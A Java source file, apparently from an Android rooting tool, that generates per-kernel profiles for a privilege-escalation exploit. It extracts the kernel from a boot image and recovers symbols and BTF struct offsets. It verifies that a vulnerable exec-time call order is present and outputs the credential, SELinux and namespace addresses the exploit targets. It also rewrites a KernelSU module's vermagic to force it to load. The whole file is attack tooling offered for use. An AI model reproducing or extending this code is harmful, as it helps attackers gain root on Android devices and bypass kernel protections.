package com.aiden.honoroneclick;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPInputStream;

/** Offline boot image unpacker and 98260 profile generator for Android. */
public final class KernelProfileGenerator {
    private static final long IMAGE_BASE = 0xffffffc080000000L;
    private static final byte[] ANDROID_MAGIC = "ANDROID!".getBytes(StandardCharsets.US_ASCII);
    private static final byte[] ARM64_MAGIC = "ARMd".getBytes(StandardCharsets.US_ASCII);

    private KernelProfileGenerator() {}

    public static final class Symbol {
        final long address;
        final String name;
        final char type;

        Symbol(long address, String name, char type) {
            this.address = address;
            this.name = name;
            this.type = type;
        }
    }

    public static final class Result {
        public final String kernel;
        public final String id;
        public final long timerLink;
        public final long credLink;
        public final long slideSiteLow;
        public final long selinuxLink;
        public final long userNs;
        public final long rootUser;
        public final long groups;
        public final long ucounts;
        public final int kitimerSize;
        public final int kitimerNode;
        public final int taskCred;
        public final int credSize;
        public final List<Symbol> symbols;
        public final long beginNewExec;
        public final int btfBase;
        public final int kallsymsCount;

        Result(String kernel, String id, long timerLink, long credLink,
               long slideSiteLow, long selinuxLink, long userNs, long rootUser,
               long groups, long ucounts, int kitimerSize, int kitimerNode,
               int taskCred, int credSize, List<Symbol> symbols,
               long beginNewExec, int btfBase, int kallsymsCount) {
            this.kernel = kernel;
            this.id = id;
            this.timerLink = timerLink;
            this.credLink = credLink;
            this.slideSiteLow = slideSiteLow;
            this.selinuxLink = selinuxLink;
            this.userNs = userNs;
            this.rootUser = rootUser;
            this.groups = groups;
            this.ucounts = ucounts;
            this.kitimerSize = kitimerSize;
            this.kitimerNode = kitimerNode;
            this.taskCred = taskCred;
            this.credSize = credSize;
            this.symbols = symbols;
            this.beginNewExec = beginNewExec;
            this.btfBase = btfBase;
            this.kallsymsCount = kallsymsCount;
        }

        public String toSymbolText() {
            StringBuilder out = new StringBuilder(symbols.size() * 48);
            for (Symbol symbol : symbols) {
                out.append(String.format(Locale.ROOT, "%016x %c %s\n",
                        symbol.address, symbol.type, symbol.name));
            }
            return out.toString();
        }

        public String safeId() {
            return id.replaceAll("[^A-Za-z0-9_.-]+", "-");
        }
    }

    public static byte[] extractKernel(byte[] boot) throws IOException {
        if (startsWith(boot, ANDROID_MAGIC)) {
            if (boot.length < 44) throw new IOException("boot.img 头部不完整");
            long kernelSizeLong = u32(boot, 8) & 0xffffffffL;
            int headerSize = u32(boot, 20);
            int headerVersion = u32(boot, 40);
            int pageSize = headerVersion >= 3 ? 4096 : u32(boot, 36);
            if (pageSize <= 0 || (pageSize & (pageSize - 1)) != 0)
                throw new IOException("无效的 boot image page size: " + pageSize);
            if (kernelSizeLong <= 0 || kernelSizeLong > 256L * 1024 * 1024)
                throw new IOException("无效的 kernel size: " + kernelSizeLong);
            int kernelOffset = align(headerSize, pageSize);
            int kernelSize = (int) kernelSizeLong;
            if (kernelOffset < 0 || kernelOffset + (long) kernelSize > boot.length)
                throw new IOException("boot.img kernel 区域越界");
            byte[] section = Arrays.copyOfRange(boot, kernelOffset, kernelOffset + kernelSize);
            return decompressKernel(section);
        }
        if (boot.length > 64 && boot[0x38] == 'A' && boot[0x39] == 'R'
                && boot[0x3a] == 'M' && boot[0x3b] == 'd') {
            return boot;
        }
        return decompressKernel(boot);
    }

    private static byte[] decompressKernel(byte[] data) throws IOException {
        if (data.length >= 2 && (data[0] & 0xff) == 0x1f && (data[1] & 0xff) == 0x8b) {
            try (GZIPInputStream in = new GZIPInputStream(new ByteArrayInputStream(data));
                 ByteArrayOutputStream out = new ByteArrayOutputStream(data.length * 2)) {
                copyLimited(in, out, 256 * 1024 * 1024);
                return out.toByteArray();
            }
        }
        if (data.length > 64 && data[0x38] == 'A' && data[0x39] == 'R'
                && data[0x3a] == 'M' && data[0x3b] == 'd') {
            return data;
        }
        throw new IOException("不支持的内核压缩格式；请提供原始 AArch64 Image 或 gzip 内核");
    }

    public static Result generate(byte[] image) throws IOException {
        ParsedKallsyms parsed = parseKallsyms(image);
        Map<String, Long> symbols = new HashMap<>(parsed.symbols.size() * 2);
        for (Symbol symbol : parsed.symbols) symbols.putIfAbsent(symbol.name, symbol.address);
        String kernel = parseKernelRelease(image);
        if (!kernel.startsWith("6.18."))
            throw new IOException("当前 KernelSU 模块仅支持 6.18 KMI 内核: " + kernel);
        Map<String, Integer> calls = vulnerabilityCalls(image, symbols);
        if (!(calls.get("posix_cpu_timers_exit") > calls.get("unshare_files")
                && calls.get("posix_cpu_timers_exit") > calls.get("exec_task_namespaces"))) {
            throw new IOException("该内核已不具备目标漏洞调用顺序");
        }

        Btf btf = new Btf(image);
        Struct kitimer = btf.requireStruct("k_itimer");
        Struct task = btf.requireStruct("task_struct");
        Struct cred = btf.requireStruct("cred");
        int kitimerNode = member(kitimer, "it");
        int taskCred = member(task, "cred");
        Map<String, Integer> requiredCred = new LinkedHashMap<>();
        requiredCred.put("uid", 8);
        requiredCred.put("suid", 16);
        requiredCred.put("cap_inheritable", 48);
        requiredCred.put("cap_permitted", 56);
        requiredCred.put("cap_effective", 64);
        requiredCred.put("cap_bset", 72);
        requiredCred.put("cap_ambient", 80);
        requiredCred.put("security", 128);
        requiredCred.put("user", 136);
        requiredCred.put("user_ns", 144);
        requiredCred.put("ucounts", 152);
        requiredCred.put("group_info", 160);
        for (Map.Entry<String, Integer> entry : requiredCred.entrySet()) {
            int actual = member(cred, entry.getKey());
            if (actual != entry.getValue())
                throw new IOException("cred." + entry.getKey() + " 偏移不兼容: "
                        + actual + " != " + entry.getValue());
        }

        long doTimerCreate = requireSymbol(symbols, "do_timer_create");
        long prepareCreds = requireSymbol(symbols, "prepare_creds");
        long timerLink = doTimerCreate + 0xb8;
        long credLink = prepareCreds + 0x2c;
        String safe = kernel.replaceAll("[^A-Za-z0-9_.-]+", "-");
        return new Result(
                kernel,
                "kernel-" + safe,
                timerLink,
                credLink,
                timerLink & 0x1fffff,
                requireSymbol(symbols, "selinux_state"),
                requireSymbol(symbols, "init_user_ns"),
                requireSymbol(symbols, "root_user"),
                requireSymbol(symbols, "init_groups"),
                requireSymbol(symbols, "init_ucounts"),
                kitimer.size,
                kitimerNode,
                taskCred,
                cred.size,
                parsed.symbols,
                requireSymbol(symbols, "begin_new_exec"),
                btf.base,
                parsed.symbols.size());
    }

    public static byte[] patchVermagic(byte[] module, String kernelRelease) throws IOException {
        if (module.length < 64 || module[0] != 0x7f || module[1] != 'E'
                || module[2] != 'L' || module[3] != 'F')
            throw new IOException("KernelSU 模板不是 ELF 文件");
        long shoff = u64(module, 0x28);
        int shentsize = u16(module, 0x3a);
        int shnum = u16(module, 0x3c);
        int shstrndx = u16(module, 0x3e);
        if (shoff < 0 || shoff + (long) shentsize * shnum > module.length)
            throw new IOException("ELF section table 越界");
        int shstr = (int) (shoff + (long) shstrndx * shentsize);
        long strOff = u64(module, shstr + 24);
        long strSize = u64(module, shstr + 32);
        if (strOff < 0 || strSize < 0 || strOff + strSize > module.length)
            throw new IOException("ELF section names 越界");
        int modinfoHeader = -1;
        byte[] wanted = ".modinfo".getBytes(StandardCharsets.US_ASCII);
        for (int i = 0; i < shnum; i++) {
            int h = (int) (shoff + (long) i * shentsize);
            int nameOff = u32(module, h);
            if (nameOff < 0 || nameOff >= strSize) continue;
            int at = (int) strOff + nameOff;
            int end = at;
            while (end < module.length && module[end] != 0) end++;
            if (Arrays.equals(Arrays.copyOfRange(module, at, end), wanted)) {
                modinfoHeader = h;
                break;
            }
        }
        if (modinfoHeader < 0) throw new IOException("KernelSU 模板没有 .modinfo");
        long oldOff = u64(module, modinfoHeader + 24);
        long oldSize = u64(module, modinfoHeader + 32);
        if (oldOff < 0 || oldSize < 0 || oldOff + oldSize > module.length)
            throw new IOException(".modinfo 越界");
        byte[] old = Arrays.copyOfRange(module, (int) oldOff, (int) (oldOff + oldSize));
        byte[] magic = "vermagic=".getBytes(StandardCharsets.US_ASCII);
        byte[] replacement = "zermagic=".getBytes(StandardCharsets.US_ASCII);
        replaceAll(old, magic, replacement);
        byte[] vermagic = ("vermagic=" + kernelRelease
                + " SMP preempt mod_unload modversions aarch64\0")
                .getBytes(StandardCharsets.US_ASCII);
        ByteArrayOutputStream out = new ByteArrayOutputStream(module.length + old.length + vermagic.length);
        out.write(module);
        int newOff = out.size();
        out.write(old);
        out.write(vermagic);
        byte[] result = out.toByteArray();
        put64(result, modinfoHeader + 24, newOff);
        put64(result, modinfoHeader + 32, old.length + vermagic.length);
        return result;
    }

    private static Map<String, Integer> vulnerabilityCalls(byte[] image, Map<String, Long> symbols)
            throws IOException {
        String[] required = {"unshare_files", "exec_task_namespaces",
                "posix_cpu_timers_exit", "exit_itimers"};
        long begin = requireSymbol(symbols, "begin_new_exec");
        long end = begin + 0x2000;
        for (long address : symbols.values()) {
            if (address > begin && address < end) end = address;
        }
        Map<String, Integer> calls = new HashMap<>();
        for (long pc = begin; pc < end; pc += 4) {
            int fileOffset = (int) (pc - IMAGE_BASE);
            if (fileOffset < 0 || fileOffset + 4 > image.length) break;
            int instruction = u32(image, fileOffset);
            if ((instruction & 0xfc000000) != 0x94000000) continue;
            int imm = instruction & 0x03ffffff;
            if ((imm & 0x02000000) != 0) imm |= 0xfc000000;
            long target = pc + (long) imm * 4;
            for (String name : required) {
                Long symbol = symbols.get(name);
                if (symbol != null && symbol == target)
                    calls.put(name, (int) pc);
            }
        }
        for (String name : required) {
            if (!calls.containsKey(name))
                throw new IOException("未找到漏洞调用顺序: " + name);
        }
        return calls;
    }

    private static String parseKernelRelease(byte[] image) throws IOException {
        Pattern pattern = Pattern.compile("Linux version ([^\\s]+)");
        Matcher matcher = pattern.matcher(new String(image, StandardCharsets.ISO_8859_1));
        if (!matcher.find()) throw new IOException("未在镜像中找到 Linux 版本字符串");
        return matcher.group(1);
    }

    private static long requireSymbol(Map<String, Long> symbols, String name) throws IOException {
        Long value = symbols.get(name);
        if (value == null) throw new IOException("缺少内核符号: " + name);
        return value;
    }

    private static int member(Struct struct, String name) throws IOException {
        Integer value = struct.members.get(name);
        if (value == null) throw new IOException("BTF 结构 " + struct.name + " 缺少字段 " + name);
        return value;
    }

    private static final class ParsedKallsyms {
        final List<Symbol> symbols;
        ParsedKallsyms(List<Symbol> symbols) { this.symbols = symbols; }
    }

    private static ParsedKallsyms parseKallsyms(byte[] image) throws IOException {
        byte[] alphabet = new byte[52];
        for (int i = 0; i < 26; i++) {
            alphabet[i * 2] = (byte) ('a' + i);
            alphabet[i * 2 + 1] = 0;
        }
        int search = 0;
        while (true) {
            int marker = indexOf(image, alphabet, search);
            if (marker < 0) throw new IOException("kallsyms token table not found");
            if (Boolean.getBoolean("hoc.profile.debug"))
                System.err.printf("kallsyms alphabet=%x%n", marker);
            search = marker + 1;
            try {
                int tokenStart = marker;
                for (int i = 0; i < 97; i++) {
                    tokenStart = lastIndexOf(image, (byte) 0, tokenStart - 2) + 1;
                    if (tokenStart <= 0) throw new IOException("bad token");
                }
                String[] tokens = new String[256];
                int pos = tokenStart;
                for (int i = 0; i < 256; i++) {
                    int end = indexOf(image, (byte) 0, pos);
                    if (end < 0) throw new IOException("bad token");
                    tokens[i] = new String(image, pos, end - pos, StandardCharsets.ISO_8859_1);
                    pos = end + 1;
                }
                int indexPos = align(pos, 8);
                if (indexPos + 512 > image.length) continue;
                int total = 0;
                boolean validIndex = true;
                for (int i = 0; i < 256; i++) {
                    int expected = total;
                    total += tokens[i].length() + 1;
                    if ((u16(image, indexPos + i * 2) & 0xffff) != expected) {
                        validIndex = false;
                        break;
                    }
                }
                if (!validIndex) continue;
                if (Boolean.getBoolean("hoc.profile.debug"))
                    System.err.printf("kallsyms table=%x index=%x%n", tokenStart, indexPos);
                int offsets = indexPos + 512;
                int baseMarker = indexOfLong(image, IMAGE_BASE, offsets,
                        Math.min(image.length, offsets + 0x2000000));
                if (baseMarker < 0) continue;
                int estimate = (baseMarker - offsets) / 4;
                if (Boolean.getBoolean("hoc.profile.debug"))
                    System.err.printf("kallsyms base=%x count=%d%n", baseMarker, estimate);
                for (int count = estimate - 4; count <= estimate + 4; count++) {
                    if (count <= 0) continue;
                    int namesPos = indexOfInt(image, count, Math.max(0, marker - 0x400000), marker);
                    while (namesPos >= 0) {
                        if ((namesPos & 3) == 0) {
                            List<Symbol> found = tryParseNames(
                                    image, namesPos, count, marker, tokenStart, tokens, offsets);
                            if (Boolean.getBoolean("hoc.profile.debug"))
                                System.err.printf("kallsyms names=%x count=%d parsed=%s%n",
                                        namesPos, count, found != null);
                            if (found != null) return new ParsedKallsyms(found);
                        }
                        namesPos = indexOfInt(image, count, namesPos + 1, marker);
                    }
                }
            } catch (IOException ignored) {
            }
        }
    }

    private static List<Symbol> tryParseNames(byte[] image, int namesPos, int count,
                                               int tokenStart, int tokenTableStart,
                                               String[] tokens, int offsets) {
        int cursor = namesPos + 8;
        List<Symbol> symbols = new ArrayList<>(count);
        try {
            for (int i = 0; i < count; i++) {
                int length = image[cursor++] & 0xff;
                if ((length & 0x80) != 0) {
                    length = (length & 0x7f) | ((image[cursor++] & 0xff) << 7);
                }
                if (length <= 0 || cursor + length > image.length) return null;
                StringBuilder name = new StringBuilder();
                for (int j = 0; j < length; j++) {
                    int token = image[cursor++] & 0xff;
                    name.append(tokens[token]);
                }
                if (name.length() == 0) return null;
                String encoded = name.toString();
                symbols.add(new Symbol(
                        IMAGE_BASE + ((u32(image, offsets + i * 4)) & 0xffffffffL),
                        encoded.substring(1), encoded.charAt(0)));
            }
        } catch (IndexOutOfBoundsException e) {
            return null;
        }
        if (cursor > tokenTableStart || tokenTableStart - cursor >= 0x5000) return null;
        boolean hasText = false;
        for (int i = 0; i < Math.min(32, symbols.size()); i++) {
            if ("_text".equals(symbols.get(i).name)) {
                hasText = true;
                break;
            }
        }
        return hasText ? symbols : null;
    }

    private static final class Struct {
        final String name;
        final int size;
        final Map<String, Integer> members = new HashMap<>();
        Struct(String name, int size) { this.name = name; this.size = size; }
    }

    private static final class Btf {
        final int base;
        final Map<String, Struct> wanted = new HashMap<>();

        Btf(byte[] image) throws IOException {
            base = findHeader(image);
            int typeOff = u32(image, base + 8);
            int typeLen = u32(image, base + 12);
            int strOff = u32(image, base + 16);
            int strLen = u32(image, base + 20);
            int typeStart = base + 24 + typeOff;
            int typeEnd = typeStart + typeLen;
            int strStart = base + 24 + strOff;
            int strEnd = strStart + strLen;
            if (typeStart < 0 || typeEnd > image.length || strStart < 0 || strEnd > image.length)
                throw new IOException("BTF 区域越界");
            int pos = typeStart;
            while (pos < typeEnd) {
                int nameOff = u32(image, pos);
                int info = u32(image, pos + 4);
                int size = u32(image, pos + 8);
                pos += 12;
                int kind = (info >>> 24) & 0x1f;
                int vlen = info & 0xffff;
                boolean kflag = (info >>> 31) != 0;
                String name = btfString(image, strStart, strEnd, nameOff);
                if (kind == 1) {
                    pos += 4;
                } else if (kind == 3) {
                    pos += 12;
                } else if (kind == 4 || kind == 5) {
                    Struct struct = null;
                    if ("k_itimer".equals(name) || "task_struct".equals(name) || "cred".equals(name)) {
                        struct = new Struct(name, size);
                        wanted.putIfAbsent(name, struct);
                    }
                    for (int i = 0; i < vlen; i++) {
                        int memberName = u32(image, pos);
                        int memberType = u32(image, pos + 4);
                        int bitOffset = u32(image, pos + 8);
                        pos += 12;
                        if (kflag) bitOffset &= 0xffffff;
                        if (struct != null) {
                            String field = btfString(image, strStart, strEnd, memberName);
                            struct.members.put(field, bitOffset / 8);
                        }
                    }
                } else if (kind == 6) {
                    pos += 8 * vlen;
                } else if (kind == 19) {
                    pos += 12 * vlen;
                } else if (kind == 13) {
                    pos += 8 * vlen;
                } else if (kind == 14 || kind == 17) {
                    pos += 4;
                } else if (kind == 15) {
                    pos += 12 * vlen;
                }
                if (pos < typeStart || pos > typeEnd + 16) throw new IOException("BTF 类型表损坏");
            }
        }

        Struct requireStruct(String name) throws IOException {
            Struct struct = wanted.get(name);
            if (struct == null) throw new IOException("BTF 缺少结构: " + name);
            return struct;
        }

        private static int findHeader(byte[] image) throws IOException {
            for (int pos = 0; pos + 24 < image.length; pos++) {
                if ((image[pos] & 0xff) != 0x9f || (image[pos + 1] & 0xff) != 0xeb) continue;
                int version = image[pos + 2] & 0xff;
                int headerLen = u32(image, pos + 4);
                int typeLen = u32(image, pos + 12);
                int strLen = u32(image, pos + 20);
                if (version == 1 && headerLen == 24 && typeLen > 0 && typeLen < 20_000_000
                        && strLen > 0 && strLen < 4_000_000)
                    return pos;
            }
            throw new IOException("内核镜像中没有 BTF");
        }

        private static String btfString(byte[] image, int start, int end, int offset) {
            if (offset <= 0 || start + offset >= end) return "";
            int at = start + offset;
            int finish = at;
            while (finish < end && image[finish] != 0) finish++;
            return new String(image, at, finish - at, StandardCharsets.UTF_8);
        }
    }

    private static void copyLimited(ByteArrayInputStream in, ByteArrayOutputStream out, int limit)
            throws IOException {
        copyLimited((java.io.InputStream) in, out, limit);
    }

    private static void copyLimited(java.io.InputStream in, ByteArrayOutputStream out, int limit)
            throws IOException {
        byte[] buffer = new byte[65536];
        int total = 0;
        int n;
        while ((n = in.read(buffer)) > 0) {
            total += n;
            if (total > limit) throw new IOException("解压后内核超过大小限制");
            out.write(buffer, 0, n);
        }
    }

    private static void replaceAll(byte[] data, byte[] from, byte[] to) {
        if (from.length != to.length) throw new IllegalArgumentException("replacement length");
        outer:
        for (int i = 0; i + from.length <= data.length; i++) {
            for (int j = 0; j < from.length; j++) {
                if (data[i + j] != from[j]) continue outer;
            }
            System.arraycopy(to, 0, data, i, to.length);
            i += from.length - 1;
        }
    }

    private static int align(int value, int alignment) {
        return (value + alignment - 1) & ~(alignment - 1);
    }

    private static boolean startsWith(byte[] data, byte[] prefix) {
        if (data.length < prefix.length) return false;
        for (int i = 0; i < prefix.length; i++) if (data[i] != prefix[i]) return false;
        return true;
    }

    private static int u16(byte[] b, int o) {
        return (b[o] & 0xff) | ((b[o + 1] & 0xff) << 8);
    }

    private static int u32(byte[] b, int o) {
        return (b[o] & 0xff) | ((b[o + 1] & 0xff) << 8)
                | ((b[o + 2] & 0xff) << 16) | ((b[o + 3] & 0xff) << 24);
    }

    private static long u64(byte[] b, int o) {
        return (u32(b, o) & 0xffffffffL) | ((u32(b, o + 4) & 0xffffffffL) << 32);
    }

    private static void put64(byte[] b, int o, long value) {
        for (int i = 0; i < 8; i++) b[o + i] = (byte) (value >>> (i * 8));
    }

    private static int indexOf(byte[] data, byte value, int from) {
        for (int i = Math.max(0, from); i < data.length; i++) if (data[i] == value) return i;
        return -1;
    }

    private static int lastIndexOf(byte[] data, byte value, int from) {
        for (int i = Math.min(from, data.length - 1); i >= 0; i--) if (data[i] == value) return i;
        return -1;
    }

    private static int indexOf(byte[] data, byte[] needle, int from) {
        outer:
        for (int i = Math.max(0, from); i + needle.length <= data.length; i++) {
            for (int j = 0; j < needle.length; j++) if (data[i + j] != needle[j]) continue outer;
            return i;
        }
        return -1;
    }

    private static int indexOfInt(byte[] data, int value, int from, int end) {
        for (int i = Math.max(0, from); i + 4 <= Math.min(end, data.length); i++) {
            if (u32(data, i) == value) return i;
        }
        return -1;
    }

    private static int indexOfLong(byte[] data, long value, int from, int end) {
        for (int i = Math.max(0, from); i + 8 <= Math.min(end, data.length); i++) {
            if (u64(data, i) == value) return i;
        }
        return -1;
    }
}
